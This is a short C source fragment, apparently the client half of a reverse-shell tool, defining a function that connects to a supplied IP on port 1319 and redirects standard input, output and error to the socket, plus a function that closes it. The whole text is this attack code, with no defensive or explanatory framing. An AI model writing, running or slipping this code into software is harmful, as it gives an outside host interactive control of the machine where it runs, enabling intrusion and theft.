
// start client side code 
// parameter is server ip and prot is 1319
int remote_shell_connect(char * dest_ip){
    
    int fd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_socket;
    server_socket.sin_family = AF_INET;
    server_socket.sin_port = htons(1319);
    server_socket.sin_addr.s_addr = inet_addr(dest_ip);

    int ret;
    ret = connect(fd, (struct sockaddr *)&server_socket, sizeof(struct sockaddr));
    assert(ret!=-1);
    
    // Redirect IO to socket fd
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    return fd;
}

void remote_shell_stop(int fd){
    close(fd);
}